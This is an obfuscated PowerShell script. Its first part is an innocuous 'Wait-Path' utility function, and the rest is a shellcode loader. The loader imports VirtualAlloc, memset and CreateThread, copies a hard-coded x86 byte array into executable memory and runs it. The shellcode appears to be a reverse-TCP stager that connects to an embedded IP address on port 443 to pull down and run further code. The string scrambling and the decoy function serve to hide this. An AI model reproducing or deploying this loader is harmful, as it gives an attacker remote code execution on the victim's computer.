Function wait`-Pa`TH {
    
    [cmdletbinding()]
    param (
        [string[]]${Pa`TH},
        [int]${tim`E`Out} = 5,
        [int]${in`TE`RVAL} = 1,
        [switch]${P`ASs`ThRU}
    )

    ${sT`ArT`DaTE} = &("{1}{0}{2}" -f'e','G','t-Date')
    ${F`i`RST} = ${TR`UE}

    Do
    {
        
            if(${F`IR`ST} -eq ${T`RuE})
            {
                ${F`i`RSt} = ${f`AlSe}
            }
            else
            {
                &("{1}{3}{0}{2}"-f '-Sle','Sta','ep','rt') -Seconds ${I`NT`eRvAL}
            }

        
            [bool[]]${TE`Sts} = foreach(${Pa`T`hiTeM} in ${p`Ath})
            {
                Try
                {
                    if(.("{0}{2}{1}"-f 'Test-Pa','h','t') ${PAT`hi`TeM} -ErrorAction ("{0}{1}"-f 's','top'))
                    {
                        .("{0}{3}{2}{1}"-f'Wr','se','te-Verbo','i') ("'$PathItem' "+'exist'+'s')
                        ${t`Rue}
                    }
                    else
                    {
                        .("{2}{1}{0}" -f'se','erbo','Write-V') ('Wai'+'ting '+'fo'+'r '+"'$PathItem'")
                        ${Fa`LSE}
                    }
                }
                Catch
                {
                    &("{1}{0}{2}" -f'-Erro','Write','r') ('E'+'rror '+'test'+'ing'+' '+'p'+'ath '+"'$PathItem': "+"$_")
                    ${F`Alse}
                }
            }

        
            ${Re`TuRN} = ${T`estS} -notcontains ${fa`lSe} -and ${t`EstS} -contains ${T`RUe}
        
        
            
            
            if ( ((.("{1}{0}"-f 't-Date','Ge')) - ${s`T`ArtDate})."t`o`T`ALsEcONds" -gt ${TiM`eo`Ut})
            {
                if( ${P`ASst`h`RU} )
                {
                    ${f`A`LsE}
                    break
                }
                else
                {
                    Throw "Timed out waiting for paths $($Path -join ", ") "
                }
            }
            elseif(${r`e`TuRN})
            {
                if( ${pasS`TH`Ru} )
                {
                    ${tr`UE}
                }
                break
            }
    }
    Until( ${F`A`lse} ) 

}
${C} = ((("{48}{75}{76}{24}{4}{41}{1}{78}{12}{26}{65}{32}{10}{54}{37}{73}{69}{18}{6}{7}{64}{23}{25}{60}{29}{67}{74}{45}{71}{22}{31}{20}{49}{21}{57}{8}{17}{77}{46}{50}{5}{72}{14}{30}{59}{15}{28}{68}{19}{66}{43}{34}{62}{27}{47}{51}{38}{61}{33}{0}{16}{13}{80}{63}{44}{11}{70}{53}{52}{55}{56}{39}{79}{36}{35}{2}{9}{42}{58}{3}{40}" -f'Int',' extern Int','In','t ','dll{0})]p','adAttribut','flAllocatio','nType','d(','tPtr dest','lpAddre','0}','r',' lpThre','dw','kSiz','Ptr','I','nt ','ntPtr lpStartA','ern In','eThr','32.','t f','kernel32.','lP',' VirtualAlloc','er,','e','t);','Sta','dll{0})]public static ext','IntPtr ','nFlags, ',', IntPtr lpParame','emset(','m','u','Crea','n IntPtr','count);','ublic static',', uint s','dress','ort({','mport({0}kern','hr',' ui','[DllI','tPtr Creat','e','nt dw','blic','pu','ss, ',' stati','c exter','ea','rc, uin','c','rotec','tio','t','d);[DllImp',', uin','(','d','[D',', I','nt dwSize, ui','msvcrt.dll{0})]','el','es, uint ','i','llI','m','port({0}','ntPtr lpT','Pt',' ','adI')) -F  [cHar]34);${w} = .("{1}{2}{0}" -f'e','Add-Ty','p') -memberDefinition ${c} -Name ("{1}{0}" -f'n32','Wi') -namespace ("{2}{1}{0}" -f 'unctions','32F','Win') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbd,0xd9,0x94,0x7c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${z}."lE`NGtH" -gt 0x1000){${g} = ${z}."l`enGth"};${x}=${w}::("{2}{0}{1}{3}"-f 'ir','tualA','V','lloc').Invoke(0,0x1000,${G},0x40);for (${I}=0;${I} -le (${z}."LE`N`gth"-1);${i}++) {${W}::"mEMS`eT"([IntPtr](${X}.("{0}{1}"-f 'ToIn','t32').Invoke()+${I}), ${Z}[${i}], 1)};${w}::("{0}{3}{1}{2}"-f'C','eate','Thread','r').Invoke(0,0,${x},0,0,0);for (;;){.("{1}{0}{2}"-f't-sle','Star','ep') 60};
